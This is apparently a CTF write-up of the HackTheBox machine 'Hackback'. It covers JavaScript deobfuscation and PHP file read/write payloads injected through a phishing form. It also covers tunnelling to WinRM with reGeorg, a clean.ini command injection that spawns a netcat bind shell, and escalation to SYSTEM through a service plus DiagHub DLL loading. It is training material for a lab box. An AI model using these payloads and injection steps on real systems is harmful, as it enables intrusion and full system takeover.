---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-07-06-hackback-hackthebox
tags:
- command injection
- custom exploitation
- dcom
- hackthebox
- obfuscation
- services
- tunneling
- windows
title: Hackback @ HackTheBox
---

This post is about hackback, a really interesting and challenging machine that was released on 23.02.19 on [hackthebox.eu](https://www.hackthebox.eu). Techniques used on this box are javascript deobfuscation, command injection, tunneling traffic through aspx and a lot of custom exploitation, in addition to a recent windows 10 exploitation technique involving DCOM.

## User Flag

The initial scan shows the following open ports:

```
80/tcp    open  http        Microsoft IIS httpd 10.0
6666/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
64831/tcp open  ssl/unknown
```

On port 80 nothing interesting can be found after checking manually and using gobuster for a while, which leaves us with port 6666 and 64831. On 6666 we are greeted with the line "Missing Command!" which indicates we can somehow issue commands here. Playing around manually with it reveals that it accepts commands as part of the url, we run `http://hackback.htb/help` and get the following result:

```
"hello,proc,whoami,list,info,services,netsat,ipconfig"
```

The various commands show a lot of information about the host, but ultimately don’t lead to anything exploitable. On Port 64831 we find an instance of gophish running, a popular framework for phishing campaigns. We can log into it with the default credentials `admin:gophish`, where we can could create phishing campaigns ourselves. Unfortunately the box is not running a mailserver though and does not allow us to specify an external mailserver, so that the actual phishing can not happen. Looking at the existing data shows that some mail templates have been configured:

![](htb_hackback_email_templates.png)

This is interesting because there should be some phishing landing pages for mails setup but we can not see any inside the gophish application. Adding the mentioned sites to our `/etc/hosts` in the format `www.hackthebox.htb` however reveals that they do actually exist:

![](htb_hackback_htb.png)

When we enter some made up credentials we can not see them inside the gophish application – this must mean that they go somewhere else, to a location we don’t know about yet at this point. To see what else could be on the server I run gobuster versus port 64831 and also its dns mode `gobuster -m dns -w ~/tools/SecLists/Discovery/DNS/subdomains-top1mil-5000.txt -u hackback.htb` to discover more subdomains, which reveals a new subdomain: admin.hackback.htb:

![](htb_hackback_admin.png)

Looking at the source of the page shows that the actual form is just a decoy and is not doing anything, however we notice that it contains this line:

```
<!-- <script SRC="js/.js"></script> --> 
```

This looks like some javascript was included and then commented out, so we look for javascript files inside the referenced folder utilizing wfuzz and a small list of words, concatenated with the .js extension:

```
wfuzz --hc 404 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt admin.hackback.htb/js/FUZZ.js
```

This quickly finds a file called "private.js", which is unfortunately heavily obfuscated. The first thing that sticks out is that it doesn’t seem the valid javascript as it starts with `ine n=['\k57\k78\k49\k6n\` and there is no `ine` keyword in the language specification. Since it is pretty obvious that this must be `var` instead we notice that it is rot13 "encrypted", which we remove by pasting it into a (decoder)\[https://cryptii.com/pipes/rot13-decoder\].

To see what the script actually does we send it through a (beautifier)\[https://beautifier.io\] to format it and paste it into a (debugger)\[https://www.webtoolkitonline.com/javascript-tester.html\] to dynamically analyze it. It doesn’t look like it contains any errors so we add a print statement (`document.write(x+z+h+y+t+s+i+k+w);`) at the end to dump the variables, resulting in the following output:

```
Secure Login Bypass Remember the secret path is 2bb6916122f1da34dcd916421e531578 Just in case I loose access to the admin panel?action=(show,list,exec,init)&site=(twitter,paypal,facebook,hackthebox)&password=********&session=Nothing more to say
```

Nice – so there is a secret path with more functionality. Going to http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ however just redirects back to the login page. Running gobuster on path new path we quickly discover a file named "webadmin.php" which sounds very interesting. With the information from the decoded javascript we know which parameters it expects. Trying `/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=admin&session=<id>` gives us the error "wrong secret key!" so the password is probably something we have to find out. Using wfuzz we quickly learn that password is "12345678" and using the same url with the new password results in some listing:

```
Array
(
    [0] => .
    [1] => ..
    [2] => 1a217fe8f0a4694ef899b1a33fd7b6661fc849abb9cdd1e1ebc426346d8dda3b.log
    [3] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```

We assume this is the log files of the actual phishing data that is collected when some victim enters their credentials at the phishing site, in this case "www.hackthebox.htb". Calling `action=show` displays the actual entries in the log, while calling `init` wipes the log file clean. I could not get the `exec` command working and as it turned out later – it wasn’t actually doing anything anyway and just including for trolling purposes.

We can exploit the whole thing by entering php data into the username field on the phishing site and the trigger the execution by calling `action=show`. However a lot of php functions are disabled in php.ini, so this limits us to some basic functionality. What is allowed is to use `file_get_contents` to read files and `file_put_contents` to write files.

Read File:

```
<?php $file = file_get_contents('<path>');echo $file;?>
```

List Dir:

```
<?php print_r(scandir(".")); ?>
```

Write File:

```
<?php $f = '<content>'; file_put_contents('<filename>', base64_decode($f));?>
```

By enumerating the box a bit with the read and list methods we find credentials in a file called "web.config.old": "simple:ZonoProprioZomaro:-(". Other files of interest could not be found at this point.

My initial thought at this point was to write an aspx shell to disk and call it, hoping it wouldn’t have the same restrictions as php, but I couldn’t get any aspx shell to either. From the service on port 6666 we can issue a netstat command on the machine and see that winrm port 5985 is open on localhost. This means if we could somehow tunnel our traffic to localhost we can login with the user we found! Turns out there is a aspx tunnel script called (reGeorg)\[https://github.com/sensepost/reGeorg\] that accomplishes exactly this! So i upload the tunnel.aspx script from reGeorg to the host via `file_put_contents` and start it with:

```
sudo python reGeorgSocksProxy.py -p 10000 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
```

Which opens a socks proxy we can connect to on localhost:10000. To use the proxy we add the line `socks4 127.0.0.1 10000` to "/etc/proxychains.conf" to use the new socks proxy. This allows us to connect to winrm with the found credentials (I used the winrm ruby shell from [alamot](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb)):

![](htb_hackback_proof_simple.png)

Sadly there is no user flag at this point which means additional steps are involved in getting there. Enumerating some more we find "c:\\util\\scripts\\log.txt" which has a time stamp in it that shows a very recent time. It turns out this is changing every few minutes so we have something running periodically. We see in "clean.ini" in the same folder, that "log.txt" is referenced:

```
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles
```

We assume that some script is using "clean.ini", which we have write access to, to write to "log.txt". Trying various injections we eventually find that we can append any command to the LogFile row in "clean.ini":

```
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt & whoami
Directory=c:\inetpub\logs\logfiles
```

This means we can get any binary executed as user hacker! We use winrm to upload a 64 bit nc.exe to "c:\\windows\\system32\\spool\\drivers\\color" and edit "clean.ini" to spawn a shell:

```
echo '[Main]' > c:\util\scripts\clean.ini
echo 'LogFile=c:\util\scripts\log.txt & c:\windows\system32\spool\drivers\color\nc64.exe -lvp 10000 -e cmd.exe'  >> c:\util\scripts\clean.ini
echo 'Directory=c:\projects' >> c:\util\scripts\clean.ini
```

One thing that did cost me a lot of time here is that it is absolutely required to use a 64-Bit version of nc.exe. While the 32-Bit version does work in principle, it hides certain files from you which makes rooting extremely hard.

Connecting to the shell via our socks proxy we can now read "user.txt".

![](htb_hackback_proof_hacker.png)

## Root Flag

After a lot of enumerating we eventually check the registry for running services and find an unusual one called "userlogger":

![](htb_hackback_services.png)

Checking the available information about it, we see that it runs as local system and is startable and stoppable by hacker – perfect. As we do not know what it actually does we download the file to a windows test vm, install it as a service and watch its behavior in sysinternals process monitor:

![](htb_process_monitor.png)

We can see it creating a logfile in C:\\Windows\\Temp that contains the string "no log file specified", which means we must be able to specify a log file when starting the service. Running it again with a path as argument we can see that it writes to the path we told it to. Checking the permissions of the specified file we can see that it is now has: Everyone (F). This is a huge as it means we can make any file local system has access to readable and writable by everyone! One problem that remains is that the userlogger executable appends ".log" to the file we specify. We can bypass this by using ":" to mark the start of an alternate datastream (ads) which leads to the ".log" part not being appended to the regular filename but instead being appended as ads.

My first instinct here is to make the root flag readable and get the flag, however that didn’t work out. The root flag can be made readable by `sc start userlogger C:\users\administrator\desktop\root.xt`, however because we miss folder permissions (?) we can not actually read it.

Looking for things that can help here I eventually found this [blogpost](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html?m=1) from google project zero, which mentions that the "Microsoft (R) Diagnostics Hub Standard Collector Service" (diaghub) can be used to load an arbitrary dll from system32. Diaghub registers a DCOM object, to which we have to learn to to talk to in order to exploit this to load an own dll. Remember the reason this whole topic makes sense is that we can write arbitrary files to system32 now with userlogger which potentially allows us to write a dll there and then load it with diaghub.

I made a separate, short post about how to exploit this [here](http://127.0.0.1/2019/03/howto_diaghub.html). So now that we know how to exploit it we can execute the actual attack:

1. overwrite license.rtf with our custom dll: `sc start userlogger c:\windows\system32\license.rtf` , `copy custom.dll c:\windows\system32\license.rtf`
2. call the diaghub exploit in order to load the dll: `diaghub.exe`

This will throw some error because we didn’t bother to implement the interface diaghub expects but it doesn’t matter because the shell has been opened!

What is left to do is connect via socks proxy to the new shell and read the root flag. Unfortunately there is some trolling involved:

![](htb_hackback_trolled-1.png)

We can see however that there is another file besides it and that the flag must be hidden in the alternate datastream, which we can read with `more < root.txt:flag.txt:$DATA`. This concludes this awesome box! Many thanks to [@decoder\_it](https://twitter.com/decoder_it) and [@yuntao\_it](https://twitter.com/yuntao_it) for creating it.